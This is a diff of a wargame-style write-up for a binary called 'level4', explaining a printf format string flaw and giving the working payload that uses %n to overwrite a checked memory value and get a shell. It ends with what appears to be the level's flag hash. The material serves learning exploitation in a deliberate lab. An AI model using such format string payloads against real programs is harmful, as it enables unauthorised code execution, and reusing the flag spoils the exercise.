@@ -1,9 +1,36 @@
-# Following the analysis of the code, we see a fgets and a printf. Here, we can't exploit the fgets, it's a secured function.
-# We see the cmp between a random value and an address in another segment.
-# We decide to exploit the printf thanks to reverse format string.
-# The "%n" formatter lets us to write into an address the value we want so we craft the address of the value to be used as reference by printf, following enough noise to equal
-# the target, i.e 16930112
-# The "$" flag lets us lead printf arg directly on the fourth stack argument, ours (our buffer).
+## Analysis
 
-python -c 'print "\x10\x98\x04\x08" + "%16930112u%12$n"' | ./level4
+The program calls fgets(), which is a secured function against buffer overflow. Then it prints the buffer.
+An impossible check is realized, if it return true, a meaningless string is printed and a shell launched via system call.
+
+`0x0804848d <+54>:    mov    eax,ds:0x8049810`
+`0x08048492 <+59>:    cmp    eax,0x1025544`
+
+Otherwise the function return 0.
+
+## Exploit
+
+Format string : the printf is called directly with the user-provided input so we can use the %n formatter to write into an address an arbitrary value.
+
+`0x08048450 <+12>:    call   0x8048340 <printf@plt>`
+
+## Crafting
+
+0		   4			  16		18	     20
+[TARGET_MEMORY_ADDR][RANDOM_PADDING_STRING][$_FORMATTER][%N_FORMATTER]
+	^					^		^
+	| 3.write(len(0 - 64))			|    1.read     |		   2.fetch
+	|					----------------------- printf() ------------ stack[3] (TARGET_MEMORY_ADDR)
+	|							         |
+	------------------------------------------------------------------
+
+We provide the %n formatter to printf(). This one let us write into the following argument the number of characters written before meeting it.
+We use the $x formatter to access the 12th argument on the stack, which is the beginning of our buffer.
+Our buffer head is the memory addres check by the critical cmp instruction.
+We pad our buffer we enough noise to match the other operand of value of cmp instruction thanks to printf padding (16930112 in the current case)
+						
+## Shooting
+
+python -c 'print "\x10\x98\x04\x08" + "%16930112u%12$n"' > /tmp/payload_level4
+cat /tmp/payload_level4 - | ./level4
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
